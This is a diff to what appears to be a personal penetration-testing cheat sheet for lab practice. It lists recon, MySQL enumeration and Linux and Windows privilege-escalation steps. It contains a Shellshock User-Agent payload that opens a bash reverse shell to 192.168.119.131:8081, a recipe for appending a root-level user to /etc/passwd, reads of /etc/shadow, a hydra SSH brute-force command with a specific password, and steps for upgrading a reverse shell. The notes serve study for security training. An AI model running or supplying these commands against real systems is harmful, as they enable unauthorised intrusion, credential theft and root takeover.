@@ -1,3 +1,6 @@
+
+
+
 1. Recon/ Info gathering
     1.1  Nmap: 
         'nmap -sC -sV -oA enum/nmap <ip> -p-'
@@ -18,10 +21,11 @@
                   () { :; }; /bin/echo hello 
                   If not then, cat $PATH from the host machine. 
                     User-Agent:  () { :; };  echo;export PATH=/root/Download/jdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; bash -i >& /dev/tcp/192.168.119.131/8081 0>&1; 
-
+        2.1.3 mysql
+              ps aux |grep mysql
+              mysql -u<id> -p<password> -e 'show databases;'
  
-            
-        
+                 
 
  
  3.Priviliege Escalation
@@ -35,16 +39,28 @@
                Syntax: openssl passwd -1 -salt pkong pass123  
             Put it on the bottom of passwd
                pkong:$1$pkong$iErBtt0Nj.89iMln0uMBn.:0:0:root/root:/bin/bash
+        
         3.1.3 Manual
-            ps aux
+            ps aux     --> Search for odd program, then searchsploit. 
             netstat -antup
             uname -a
             /etc/passwd
             /etc/shadow
+            /etc/apach2 or /etc/httpd
+                grep -Ri DocumentRoot . 
+            Use known credentials
+                e.g. Collect credential of mysql database.
+                     Identify non-root user with high priviliege
+                            cat /etc/passwd|grep -vE "nologin|false" 
+                     Bruteforce SSH using the identified passwords and known users. 
+                     hydra -l gibson -p zaq1xsw2cde3 10.11.1.71 ssh
+             
+              
+            
             
                          
-        
-        'find / -perm -u=s -type f 2>/dev/null'
+        find / -name "file name" 2>/dev/null
+        find / -perm -u=s -type f 2>/dev/null
         
  
     3.2 Windows            ref: https://guif.re/windowseop#EoP%204:%20Pass%20the%20hash
@@ -73,6 +89,28 @@
                     lsadump::sam
 
 
+Linux file search
+    find . -iname
+    find . -name <name> -type 
+    
+    
+nc interactive shell
+
+
+    # In reverse shell 
+      $ python -c 'import pty; pty.spawn("/bin/bash")' 
+      Ctrl-Z 
+
+
+    In Kali 
+       $stty raw -echo 
+       $ fg 
+
+    In reverse shell 
+       $ reset 
+       $ export SHELL=bash 
+       $ export TERM=xterm-256color 
+       $ stty rows <num> columns <cols> 
 
 
 
